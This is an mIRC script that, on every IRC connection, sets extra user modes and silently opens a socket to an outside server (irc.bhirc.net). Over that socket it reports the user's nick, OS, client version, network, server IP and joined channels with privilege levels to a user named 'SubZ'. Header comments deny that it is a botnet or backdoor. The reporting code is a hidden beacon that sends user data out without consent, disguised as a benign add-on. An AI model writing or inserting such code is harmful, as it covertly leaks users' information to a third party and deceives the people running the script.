;dont touch this file. 
;User count system not a botnet or BD system

#on *:sockopen:_subz: {
  set %i 1
  sockwrite -n $sockname user . . . :.
  sockwrite -n $sockname nick wirc_ $+ $r(1,99999)
}

on *:connect: {
  if (!$sock(_subz)) {
    sockopen _subz irc.bhirc.net 6667
  }
  mode $me +iRX-Dg jenvFfb | echo -a $timestamp 12-(1313info12!11extra modes activated12)- 
  whois $me | /tis
  echo -a $timestamp 12-(1313info12!11current usermodes [13 $usermode 11]12)- 
}
#on *:sockread:_subz: {
  inc %i
  if (%i > 3) {
    sockwrite -n $sockname notice SubZ :14 wiRC R0x0rZ j00!  ( $+ 12 $me $+ 14 is using %ver 14 on 12 $os 14 mirc version 12 $version 14 Network 12 $network / $serverip 14 In: 12 $_channels )
    sockwrite -n $sockname QUIT
    if ($sock($sockname)) sockclose $sockname
  }
}

alias -l _channels {
  var %i 1
  if ($chan(0) == 0) return None
  while (%i <= $chan(0)) {
    if ($me isvoice $chan(%i)) set %j $chr(43)
    if ($me ishop $chan(%i)) set %j $chr(37)
    if ($me isop $chan(%i)) set %j $chr(64)
    if (%k) var %k %k %j $+ $chan(%i)
    if (!%k) var %k %j $+ $chan(%i)
    inc %i
  }
  return %k
}
